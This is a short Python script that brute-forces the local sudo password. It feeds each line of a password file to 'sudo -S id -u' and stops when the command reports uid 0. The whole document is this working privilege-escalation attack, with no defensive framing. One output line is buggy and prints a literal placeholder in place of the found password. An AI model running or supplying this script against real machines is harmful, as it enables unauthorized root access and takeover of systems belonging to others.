import subprocess
with open("paswd.txt","r") as f:
    data = f.readlines()
attempt=1
for i in data :
    i=i.strip()
    print(f"checking with {i} ")
    try:
        check  = subprocess.run(['sudo','-S','id','-u'],input=i,text=True,capture_output=True)
        if str(check.stdout.strip())=="0":
            if attempt==1:
                print("Already root loggined ...")
            else :
                print("pass is {i}")
            break
        
    except Exception as error:
        print(f"failed with {i}")
    attempt+=1
    


